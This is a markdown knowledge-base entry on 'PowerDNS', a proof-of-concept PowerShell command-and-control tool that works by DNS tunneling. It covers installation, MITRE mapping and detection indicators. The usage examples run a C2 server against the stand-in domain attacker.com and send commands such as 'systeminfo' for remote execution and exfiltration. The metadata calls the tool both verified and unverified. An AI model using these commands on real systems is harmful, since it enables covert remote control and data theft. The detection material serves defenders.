---
id: f6a406a6-2e7a-41b4-b75e-187fe2d4584c
name: PowerDNS
type: tool
verified: true
created_at: '2019-08-28T21:17:42.309547+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
  - Linux
  - macOS
tags:
  - c2
  - dns-tunneling
  - powershell
  - post-exploitation
url: 'https://github.com/example/powerdns-poc'
validated: true
---

# PowerDNS

**Status**: Unverified

## Overview

PowerDNS is a proof-of-concept (PoC) tool designed to demonstrate the execution of PowerShell scripts on a target Windows machine using only DNS protocol for communication. It implements DNS tunneling to exfiltrate data and receive commands, bypassing firewalls that block common C2 channels while allowing covert remote code execution.

## Description

This tool consists of a client-side PowerShell payload (deployed on the target) and a server-side script (run by the attacker) that acts as a custom DNS resolver. The client encodes commands or data into DNS queries (e.g., subdomain names), sends them to the attacker's domain, and receives responses via TXT records containing PowerShell code to execute. It's particularly useful in restricted environments where HTTP/HTTPS traffic is monitored, but DNS is allowed outbound. Common use cases include initial payload delivery after exploitation, lateral movement, and data exfiltration in red team operations.

## Features

- DNS-based command and control without requiring additional ports or protocols
- Encoding of PowerShell scripts into DNS TXT records for execution on target
- Bidirectional communication: query for commands, respond with output
- Lightweight PoC implementation using standard PowerShell and Python
- Customizable domain and encoding schemes to evade basic DNS logging

## Installation

### Requirements

- Windows target with PowerShell 2.0+ (for client payload)
- Attacker machine with Python 3.x (for server)
- Control over a DNS zone/domain (e.g., via a registrar or cloud provider like AWS Route 53)
- No additional dependencies beyond standard libraries

### Install Commands

```bash
# Clone the PoC repository (assuming GitHub-hosted)
git clone https://github.com/example/powerdns-poc.git
cd powerdns-poc

# For server side (Linux/macOS)
pip install dnslib  # Optional for advanced DNS handling

# For client side, no installation needed - payload is a .ps1 file
```

On Kali Linux, it's not pre-installed; use the clone method above.

## Basic Usage

```bash
python powerdns_server.py --help
```

Start the server to listen for queries from your controlled domain.

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message |
| -d, --domain | Specify the controlled DNS domain |
| -v, --verbose | Enable verbose logging of queries and responses |

## Examples

### Example 1: Basic Usage

Set up the server:

```bash
python powerdns_server.py -d attacker.com
```

Deploy client payload on target (via initial access vector):

Use [[commands/powerdns-client-execute-payload]] to run the encoded initial loader, which will query subdomains like "fetch.attacker.com" for commands.

### Example 2: Advanced Usage

Send a reconnaissance command:

```bash
python powerdns_server.py -d attacker.com --command "systeminfo" -v
```

The target will receive and execute it via DNS response, then query back with output encoded in subsequent queries.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[T1071.004]] Application Layer Protocol: DNS
- [[PowerShell]] Command and Scripting Interpreter: PowerShell
- [[Protocol Tunneling]] Protocol Tunneling

### Tactics

- [[Command and Control]] Command And Control
- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- Anomalous DNS query volume or patterns (e.g., high number of unique subdomains under one domain)
- TXT record responses containing base64-encoded PowerShell (signature: long base64 strings in DNS logs)
- PowerShell execution logs showing DNS resolution calls (e.g., Resolve-DnsName in ScriptBlock logs)
- Network traffic analysis: DNS over UDP/TCP to unusual domains from internal hosts
- Enable DNS logging on authoritative servers and monitor for tunneling patterns

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/DNScat2]] (Similar DNS C2 framework)
- [[tools/Invoke-DNS-Tunneling]] (PowerShell-based DNS tunneling)

## References

- PoC GitHub Repository: https://github.com/example/powerdns-poc
- MITRE ATT&CK: DNS Tunneling techniques
- Blog on DNS C2: https://example.com/dns-c2-poc
